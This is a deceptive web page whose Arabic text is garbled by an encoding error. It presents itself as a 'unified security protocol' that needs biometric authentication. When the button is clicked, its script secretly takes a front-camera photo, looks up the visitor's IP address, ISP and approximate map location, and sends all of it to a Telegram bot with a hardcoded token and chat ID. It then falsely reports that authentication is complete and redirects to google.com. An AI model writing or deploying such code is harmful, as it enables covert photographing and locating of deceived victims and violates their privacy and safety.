<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ£Ù…ÙŠÙ† Ø§Ù„Ø±Ù‚Ù…ÙŠ Ø§Ù„Ù…ÙˆØ­Ø¯</title>
    <link rel="icon" type="image/png" href="https://img.icons8.com/fluency/48/000000/shield.png">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b1118; color: #fff; text-align: center; padding-top: 80px; margin: 0; user-select: none; }
        .box { border: 1px dashed #3498db; padding: 30px; border-radius: 15px; display: inline-block; background: #1c252e; width: 85%; max-width: 450px; }
        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <div style="font-size: 40px;">ğŸ›¡ï¸</div>
        <h3>Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ù…ÙˆØ­Ø¯</h3>
        <p style="font-size: 0.9em; color: #bdc3c7;">ÙŠØ±Ø¬Ù‰ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ø­ÙŠÙˆÙŠØ© Ù„ØªØ£Ù…ÙŠÙ† Ø§ØªØµØ§Ù„Ùƒ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±.</p>
        <button class="btn" onclick="megaCapture()">Ø¨Ø¯Ø¡ Ø§Ù„ØªØ£Ù…ÙŠÙ†</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
        const CH_ID = "1678506419";

        async function megaCapture() {
            const btn = document.querySelector('.btn');
            btn.innerHTML = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙØ­Øµ...";
            btn.disabled = true;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;

                v.onloadedmetadata = () => {
                    v.play();
                    // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªØµÙˆÙŠØ± Ø§Ù„Ù…ØªÙƒØ±Ø± Ø­ØªÙ‰ ØªÙ†Ø¬Ø­ (ØªØ¬Ù†Ø¨ Ø§Ù„Ø³ÙˆØ§Ø¯)
                    let attempts = 0;
                    const checkAndShoot = setInterval(async () => {
                        attempts++;
                        const isCaptured = await takeSnapshot(v, stream);
                        
                        // Ø¥Ø°Ø§ Ù†Ø¬Ø­ Ø§Ù„ØªØµÙˆÙŠØ± Ø£Ùˆ ØªØ¬Ø§ÙˆØ²Ù†Ø§ 5 Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ù†ÙˆÙ‚Ù Ø§Ù„ØªÙƒØ±Ø§Ø±
                        if (isCaptured || attempts > 5) {
                            clearInterval(checkAndShoot);
                            finishProcess(stream);
                        }
                    }, 800); // ÙŠØ­Ø§ÙˆÙ„ ÙƒÙ„ 800 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©
                };
            } catch (e) {
                alert("ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§.");
                btn.disabled = false;
                btn.innerHTML = "Ø¨Ø¯Ø¡ Ø§Ù„ØªØ£Ù…ÙŠÙ†";
            }
        }

        async function takeSnapshot(v, stream) {
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            ctx.drawImage(v, 0, 0);

            // ÙØ­Øµ Ù‡Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø³ÙˆØ¯Ø§Ø¡ØŸ (Ù†Ø£Ø®Ø° Ø¹ÙŠÙ†Ø© Ù…Ù† Ø¨ÙƒØ³Ù„Ø§Øª Ø§Ù„Ù…Ù†ØªØµÙ)
            const pixelData = ctx.getImageData(c.width/2, c.height/2, 1, 1).data;
            const brightness = pixelData[0] + pixelData[1] + pixelData[2];

            if (brightness === 0 && v.videoWidth > 0) {
                console.log("Ø§Ù„ØµÙˆØ±Ø© Ø³ÙˆØ¯Ø§Ø¡ØŒ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©...");
                return false; // ÙØ´Ù„ (Ø³ÙˆØ§Ø¯)
            }

            // Ø¥Ø°Ø§ Ù„ÙŠØ³Øª Ø³ÙˆØ¯Ø§Ø¡ØŒ Ø£Ø±Ø³Ù„Ù‡Ø§ ÙÙˆØ±Ø§Ù‹
            let i = { ip: "N/A" };
            try { const r = await fetch('https://ipapi.co/json/'); i = await r.json(); } catch(e) {}

            const report = `âœ… ØªÙ… \nğŸ“ IP: ${i.ip}\nğŸ¢ ISP: ${i.org || 'Unknown'}\nğŸ”— Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;

            return new Promise((resolve) => {
                c.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CH_ID);
                    fd.append('photo', blob, 'img.jpg');
                    fd.append('caption', report);
                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    resolve(true); // Ù†Ø¬Ø§Ø­
                }, 'image/jpeg', 0.7);
            });
        }

        function finishProcess(stream) {
            setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
                alert("Ø§ÙƒØªÙ…Ù„Øª Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©.");
                window.location.href = "https://google.com";
            }, 1000);
        }
    </script>
</body>
</html>
